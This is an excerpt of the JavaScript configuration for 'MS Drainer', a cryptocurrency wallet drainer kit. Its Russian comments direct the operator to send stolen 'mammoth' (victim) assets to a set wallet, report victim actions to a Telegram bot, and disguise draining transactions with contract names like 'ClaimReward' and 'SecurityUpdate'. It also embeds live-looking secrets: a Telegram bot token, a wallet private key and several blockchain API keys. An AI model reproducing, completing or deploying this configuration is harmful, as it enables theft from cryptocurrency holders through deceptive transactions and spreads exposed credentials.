console.log('\n\t===========================================================================================');
console.log('\t============================= MS DRAINER BY ALL DRAINERS STORE =============================');
console.log('\t===========================================================================================\n');
...
const GOLD_Protection = false; // Если стоит "true", будет активирована дополнительная защита бекенда
...
const MS_Telegram_Token = "7553676839:AAEkHhPJtlkEONxwyKxTMsAAe6GPuvPJ5m4"; // Сюда вписать свой токен от бота из @BotFather
const MS_Telegram_Chat_ID = " https://t.me/+dzVgCSUxrfY2Nzg0"; // Сюда вписать ID чата, куда нужно отправлять уведомления о действиях мамонта

const MS_Wallet_Address = "0x626BAeFB6Be6138D33Eb38390695ef63bC4773c0"; // Адрес кошелька, куда будут идти активы мамонта
const MS_Wallet_Private = "5ccb1637f76c729c5968af1180cd8ce5c0ff72bffb178b448fd4675e89135355"; // Приватный ключ от кошелька выше (ОБЯЗАТЕЛЬНО)
const MS_Wallet_Receiver = "0x626BAeFB6Be6138D33Eb38390695ef63bC4773c0"; // Кошелек, куда будут приходить активы, может быть таким же, как MS_Wallet_Address
...
const MS_Ankr_Token = ""; // Токен от Ankr Premium, используется если MS_Use_DeBank отключен
const MS_DeBank_Token = "6d89ea8c66c5086487451ab2d086f8a14f49b7bb"; // Токен от Cloud DeBank API, если используется анализ через него
...
const MS_Settings = {
  ...
  Chains: {
    eth: { // Ethereum, настройки сети
      ...
      API: 'T7VY4FBQXNSWAU3AIEVJM3CAKTRMCJX3KS', // Etherscan API Key (не менять, если не уверены)
      ...
      Contract_Type: "ClaimReward", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
    ...
    bsc: { // Binance Smart Chain, настройки сети
      ...
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: '4J85PEVNP15AFAIBKWCW7BB4D5U1CGWZ58', // Bscscan API Key (не менять, если не уверены)
    ...
    polygon: { // Polygon (MATIC), настройки сети
      ...
      Min_Tokens_Price: 1, // минимальная стоимость токена в USD
      Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
      API: '2VFHNG14V5WRRBU8UK6GPFAGFDI3TG84C1', // Polygonscan API Key (не менять, если не уверены)
      Contract_Address: "0xd4d7e9e1d0dae333d83e174572de6bc473378bf1", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
      Contract_Type: "ClaimReward", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
    },
